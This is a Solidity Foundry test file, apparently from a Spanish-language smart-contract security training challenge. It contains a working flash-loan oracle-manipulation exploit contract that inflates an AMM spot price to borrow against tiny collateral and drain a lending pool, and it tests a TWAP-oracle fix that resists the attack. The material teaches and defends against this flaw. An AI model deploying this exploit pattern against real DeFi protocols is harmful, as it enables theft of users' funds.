// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {BaseChallenge} from "./base/BaseChallenge.t.sol";
import {
    MiniToken,
    SimpleAMM,
    FlashLender,
    PrestamosVulnerable,
    IFlashBorrower
} from "../src/C7-oraculo-flashloan/Vulnerable.sol";
import {PrestamosFixed, OraculoTWAP} from "../src/C7-oraculo-flashloan/Fixed.sol";

/// @notice Orquesta el ataque atómico: flash loan -> manipular precio -> pedir
/// prestado contra colateral inflado -> deshacer el swap -> devolver el flash.
contract AtacanteOraculo is IFlashBorrower {
    MiniToken token;
    MiniToken usdc;
    SimpleAMM amm;
    FlashLender lender;
    PrestamosVulnerable prestamos;
    uint256 flashAmount;
    uint256 borrowAmount;

    constructor(address t, address u, address a, address l, address p) {
        token = MiniToken(t);
        usdc = MiniToken(u);
        amm = SimpleAMM(a);
        lender = FlashLender(l);
        prestamos = PrestamosVulnerable(p);
    }

    function atacar(uint256 _flash, uint256 _borrow) external {
        flashAmount = _flash;
        borrowAmount = _borrow;
        lender.flashLoan(_flash); // dispara onFlashLoan
    }

    function onFlashLoan(uint256 amount) external {
        // 1. Inflar el precio del token: meter todo el USDC prestado en el AMM.
        usdc.approve(address(amm), amount);
        amm.swapUsdcForToken(amount);

        // 2. Depositar el colateral propio (minúsculo) y pedir prestado a precio inflado.
        token.approve(address(prestamos), token.balanceOf(address(this)));
        prestamos.depositar(1e18); // 1 token propio
        prestamos.pedir(borrowAmount); // drena el USDC del protocolo

        // 3. Deshacer el swap para recuperar el capital del flash loan.
        uint256 restante = token.balanceOf(address(this));
        token.approve(address(amm), restante);
        amm.swapTokenForUsdc(restante);

        // 4. Devolver el flash loan.
        usdc.transfer(address(lender), flashAmount);
    }
}

contract C7_OraculoFlashloan is BaseChallenge {
    MiniToken token;
    MiniToken usdc;
    SimpleAMM amm;
    FlashLender lender;

    function _setupInfra() internal {
        token = new MiniToken("TOKEN");
        usdc = new MiniToken("USDC");
        amm = new SimpleAMM(address(token), address(usdc));

        // AMM: 100 TOKEN / 100.000 USDC -> precio justo = 1.000 USDC/token.
        token.mint(deployer, 100e18);
        usdc.mint(deployer, 100_000e18);
        vm.startPrank(deployer);
        token.approve(address(amm), type(uint256).max);
        usdc.approve(address(amm), type(uint256).max);
        amm.init(100e18, 100_000e18);
        vm.stopPrank();

        // Prestamista flash con 900.000 USDC.
        lender = new FlashLender(address(usdc));
        usdc.mint(address(lender), 900_000e18);
    }

    function test_Exploit_Vulnerable() public {
        _setupInfra();

        PrestamosVulnerable prestamos =
            new PrestamosVulnerable(address(token), address(usdc), address(amm));
        usdc.mint(address(prestamos), 100_000e18); // pool de préstamos
        assertFalse(prestamos.isSolved());
        assertEq(prestamos.precioToken(), 1000e18, "precio justo inicial");

        // El atacante solo aporta 1 token real (valor justo ~1.000 USDC).
        AtacanteOraculo exploit = new AtacanteOraculo(
            address(token), address(usdc), address(amm), address(lender), address(prestamos)
        );
        token.mint(address(exploit), 1e18);

        exploit.atacar(900_000e18, 100_000e18);

        // El protocolo queda drenado; el atacante se lleva ~100.000 USDC con un
        // colateral real de ~1.000.
        assertTrue(prestamos.isSolved(), "el protocolo queda sin USDC");
        assertEq(usdc.balanceOf(address(exploit)), 100_000e18, "beneficio del atacante");
        assertEq(prestamos.precioToken(), 1000e18, "el precio spot vuelve a la normalidad");
    }

    function test_Fixed_Resiste() public {
        _setupInfra();

        // Oráculo TWAP de 30 minutos sobre el acumulador del AMM. Pasada la
        // ventana, la media refleja el precio justo de 1.000 USDC/token.
        OraculoTWAP oraculo = new OraculoTWAP(address(amm), 30 minutes);
        vm.warp(block.timestamp + 30 minutes);
        PrestamosFixed prestamos =
            new PrestamosFixed(address(token), address(usdc), address(oraculo));
        assertEq(prestamos.precioToken(), 1000e18, "TWAP = precio justo");
        usdc.mint(address(prestamos), 100_000e18);

        AtacanteFixed exploit = new AtacanteFixed(
            address(token), address(usdc), address(amm), address(lender), address(prestamos)
        );
        token.mint(address(exploit), 1e18);

        // Aunque manipule el spot, la valoración no cambia: pedir 100.000 contra
        // 1 token (valor 1.000) revierte.
        vm.expectRevert(bytes("sobre-colateralizado"));
        exploit.atacar(900_000e18, 100_000e18);

        assertFalse(prestamos.isSolved(), "el protocolo conserva su USDC");
    }

    /// @notice Un swap grande mueve el precio spot, pero no el TWAP del mismo bloque.
    function test_Fixed_TWAP_NoSeMueveEnUnBloque() public {
        _setupInfra();
        OraculoTWAP oraculo = new OraculoTWAP(address(amm), 30 minutes);
        vm.warp(block.timestamp + 30 minutes);
        PrestamosVulnerable referenciaSpot =
            new PrestamosVulnerable(address(token), address(usdc), address(amm));

        // Una persona compra con 900.000 USDC (operación legítima de gran tamaño).
        usdc.mint(user1, 900_000e18);
        vm.startPrank(user1);
        usdc.approve(address(amm), type(uint256).max);
        amm.swapUsdcForToken(900_000e18);
        vm.stopPrank();

        assertEq(referenciaSpot.precioToken(), 100_000e18, "el spot se multiplica por 100");
        assertEq(oraculo.precio(), 1000e18, "el TWAP no cambia en el mismo bloque");

        // Solo si el precio alterado se mantiene en el tiempo empieza a pesar.
        vm.warp(block.timestamp + 30 minutes);
        assertGt(oraculo.precio(), 1000e18, "el TWAP se mueve si el precio se sostiene");
    }
}

/// @notice Igual que AtacanteOraculo pero contra la versión corregida.
contract AtacanteFixed is IFlashBorrower {
    MiniToken token;
    MiniToken usdc;
    SimpleAMM amm;
    FlashLender lender;
    PrestamosFixed prestamos;
    uint256 flashAmount;
    uint256 borrowAmount;

    constructor(address t, address u, address a, address l, address p) {
        token = MiniToken(t);
        usdc = MiniToken(u);
        amm = SimpleAMM(a);
        lender = FlashLender(l);
        prestamos = PrestamosFixed(p);
    }

    function atacar(uint256 _flash, uint256 _borrow) external {
        flashAmount = _flash;
        borrowAmount = _borrow;
        lender.flashLoan(_flash);
    }

    function onFlashLoan(uint256 amount) external {
        usdc.approve(address(amm), amount);
        amm.swapUsdcForToken(amount);
        token.approve(address(prestamos), token.balanceOf(address(this)));
        prestamos.depositar(1e18);
        prestamos.pedir(borrowAmount); // revierte: oráculo no manipulable
        uint256 restante = token.balanceOf(address(this));
        token.approve(address(amm), restante);
        amm.swapTokenForUsdc(restante);
        usdc.transfer(address(lender), flashAmount);
    }
}
